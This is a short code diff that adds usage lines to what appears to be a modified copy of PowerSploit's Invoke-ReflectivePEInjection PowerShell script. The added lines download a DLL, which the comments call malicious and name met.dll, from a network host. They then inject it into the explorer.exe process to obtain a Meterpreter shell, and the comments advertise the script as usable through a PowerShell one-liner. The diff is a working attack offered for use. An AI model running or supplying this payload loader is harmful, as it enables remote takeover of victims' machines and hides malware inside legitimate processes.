@@ -1,3 +1,5 @@
+#THIS SCRIPT IS THE FIXED VERSION OF THIS SCRIPT: https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
+#GO TO THE LAST LINES OF THE SCRIPT TO REVIEW THE USAGE, (the major advantatge of this script is that it can be thrown through a powershell one-liner to get a meterpreter shell)
 function Invoke-ReflectivePEInjection
 {
 <#
@@ -2883,7 +2885,9 @@ Function Main
 Main
 }
 
+#Storing the malicious DLL contents into a bytearray and resolving the explorer.exe PID
 $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.82/met.dll')
 $procid = (Get-Process -Name explorer).Id
 
+#Finally invoking the function with the parameters specified
 Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
